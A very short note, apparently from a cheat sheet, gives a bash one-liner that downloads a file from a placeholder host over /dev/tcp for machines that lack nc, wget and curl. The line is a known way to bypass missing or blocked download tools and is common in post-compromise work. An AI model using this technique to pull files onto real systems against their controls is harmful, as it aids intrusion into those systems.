## No nc, no wget no curl even. Here is a one-liner bash to transfer files
fname="yourfile.txt"
bash -c "exec 3<>/dev/tcp/IP/80; echo -e 'GET /${fname} HTTP/1.1\r\nHost: ip\r\nConnection: close\r\n\r\n' >&3; cat <&3 > ${fname}"
